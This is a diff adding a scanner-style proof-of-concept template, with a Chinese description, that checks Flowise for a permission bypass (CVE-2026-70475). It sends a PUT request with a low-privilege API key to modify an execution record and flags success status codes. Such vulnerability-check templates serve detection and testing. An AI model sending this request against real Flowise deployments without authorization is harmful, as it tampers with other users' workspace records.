@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "验证 Flowise PUT /api/v1/executions/:id 端点是否存在权限绕过漏洞。向该端点发送 PUT 请求，若返回成功状态码（200/201/202/204），则表示低权限用户可修改工作区中的执行记录。需提供有效的 execution-id 和低权限 API 密钥进行测试。"
+id = "POC-AVE-2026-1370"
+name = "CVE-2026-70475 PoC"
+severity = "high"
+tags = ["ave-2026-1370"]
+vuln_id = [
+    "CVE-2026-70475",
+    "AVE-2026-1370",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "PUT"
+path = "/api/v1/executions/1"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"state": "FINISHED", "data": "test"}'
+type = "raw"
+
+[poc.requests.headers]
+Authorization = "Bearer test-api-key"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    201,
+    202,
+    204,
+]
+type = "status"
